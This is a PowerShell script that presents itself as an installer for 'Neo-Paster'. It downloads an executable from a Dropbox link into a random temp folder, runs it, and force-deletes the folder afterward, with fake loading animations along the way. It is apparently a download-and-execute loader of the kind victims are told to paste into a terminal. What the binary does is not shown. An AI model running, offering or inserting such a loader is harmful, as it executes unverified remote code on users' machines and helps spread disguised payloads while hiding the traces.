$url = "https://www.dropbox.com/scl/fi/pywkslydef69f64ga6ukp/neopaster.exe?rlkey=yjfxi2hibb9bmdhe7acs94yu2&st=4xf7ng1c&dl=1"  
$tempdir = "$env:TEMP\$(New-Guid)" 
mkdir $tempdir | Out-Null
$file = "$tempdir\app.exe" 

# Simulate download start
Write-Host "Download started..." -ForegroundColor Cyan
Start-Sleep -Seconds 1  # Simulate the downloading animation

try {
    # Download the file
    irm -Uri $url -OutFile $file -ErrorAction Stop
    Write-Host "Download complete!" -ForegroundColor Green
    Start-Sleep -Seconds 1  # Pause to simulate download completion

    # Neo-Paster loading animation
    Write-Host "Neo-Paster is loading..." -ForegroundColor Yellow
    Start-Sleep -Seconds 2  # Simulate loading time

    # Start the process (Neo-Paster)
    $proc = Start-Process $file -PassThru -Wait 
    Write-Host "Process exited with code: $($proc.ExitCode)" -ForegroundColor Green

} catch {
    Write-Error "An error occurred: $_" -ForegroundColor Red
} finally {
    # Simulate cleanup process
    Write-Host "Cleaning up temporary files..." -ForegroundColor Magenta
    Start-Sleep -Seconds 1  # Simulate cleanup process
    ri $tempdir -Recurse -Force -ErrorAction SilentlyContinue  
    Write-Host "Temporary files removed. Have a nice day!" -ForegroundColor Blue
}
